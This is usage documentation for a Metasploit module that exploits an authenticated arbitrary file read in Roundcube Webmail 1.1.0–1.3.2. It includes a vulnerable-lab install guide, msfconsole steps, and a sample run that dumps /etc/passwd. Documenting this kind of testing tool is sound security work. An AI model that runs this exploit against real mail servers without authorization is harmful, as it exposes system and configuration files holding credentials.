## Vulnerable Application

Roundcube Webmail allows unauthorized access to arbitrary files on the host's filesystem, including configuration files.
This affects all versions from 1.1.0 through version 1.3.2. The attacker must be able to authenticate at the target system
with a valid username/password as the attack requires an active session.

Tested against version 1.3.2

### Install Roundcube 1.3.2 on Ubuntu 22.04

Instructions are loosely based on https://www.digitalocean.com/community/tutorials/how-to-install-your-own-webmail-client-with-roundcube-on-ubuntu-16-04

The main point of pain is installing PHP 7.0 on Ubuntu 22.04

#### Install LAMP

```
sudo apt-get install -y tasksel
sudo tasksel install lamp-server
```

#### Install PHP 7.0

```
sudo apt install software-properties-common ca-certificates lsb-release apt-transport-https dbconfig-sqlite3
LC_ALL=C.UTF-8 sudo add-apt-repository ppa:ondrej/php
sudo apt update
sudo apt-get install php7.0 php7.0-xml php7.0-mbstring php7.0-intl php7.0-zip php7.0-sqlite3
sudo a2dismod php8.1
sudo a2enmod php7.0
```

#### Configure PHP

```
sudo nano /etc/php/7.0/apache2/php.ini
```

Uncomment the following lines:

```
extension=php_mbstring.dll
extension=php_xmlrpc.dll
extension=php_pdo_sqlite.dll
```

Add the following line to the end of the extension list:

```
extension=dom.so
```

Uncomment and change the following values:

```
date.timezone = "America/New_York"
upload_max_filesize = 12M
post_max_size = 18M
mbstring.func_overload = 0
```

#### Install dovecot

```
sudo apt install dovecot-imapd
```

#### Install Roundcube

```
wget https://github.com/roundcube/roundcubemail/releases/download/1.3.2/roundcubemail-1.3.2-complete.tar.gz -O /tmp/roundcubemail-1.3.2-complete.tar.gz
sudo tar -zxf /tmp/roundcubemail-1.3.2-complete.tar.gz -C /var/www/html/
sudo chown -R root:root /var/www/html/roundcubemail-1.3.2/
```
#### Configure Apache

```
sudo cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/roundcubemail-1.3.2-complete.config
sudo vi /etc/apache2/sites-available/roundcubemail-1.3.2-complete.config
```

Update `ServerName <rhost IP>` `DocumentRoot /var/www/html/roundcubemail-1.3.2/`

Save and close the file, now reload Apache

```
sudo systemctl restart apache2
```

Browse to `/installer`.  Almost all settings will be kept as default,
however, for the database setup we'll use a sqlite db for ease.
Select `SQLite`, and change the Database name to `/tmp/roundcube.db`.
all other fields within `db_dsnw` should be blank.

On the next screen, make sure to click the button under Check DB config
to create the initial database.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/roundcube_auth_file_read`
1. Do: `set rhost [ip]`
1. Do: `set USERNAME [username]`
1. Do: `set PASSWORD [password]`
1. Do: `run`
1. You should get contents of specified file.

## Options

## Scenarios

### Roundcube 1.3.2 with php 7.0 on Ubuntu 22.04

```
resource (msf)> set rhost 10.10.10.10
rhost => 10.10.10.10
resource (msf)> set TARGETURI /roundcubemail-1.3.2/
TARGETURI => /roundcubemail-1.3.2/
resource (msf)> set rport 80
rport => 80
resource (msf)> set verbose true
verbose => true
resource (msf)> set USERNAME roundcube_user
USERNAME => roundcube_user
resource (msf)> set PASSWORD roundcube_password
PASSWORD => roundcube_password
msf6 auxiliary(gather/roundcube_auth_file_read) > run
[*] Running module against 10.10.10.10

[+] Token Value: JDGak0VjivacBBT9FVJbN4eqaelDHLX0
[*] Attempting login
[*] Attempting exploit
[+] root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
arangodb:x:998:999:ArangoDB Application User:/usr/share/arangodb3:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
postgres:x:115:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
dovecot:x:116:122:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:117:123:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
roundcube_user:x:1001:1001:,,,:/home/roundcube_user:/bin/bash
```
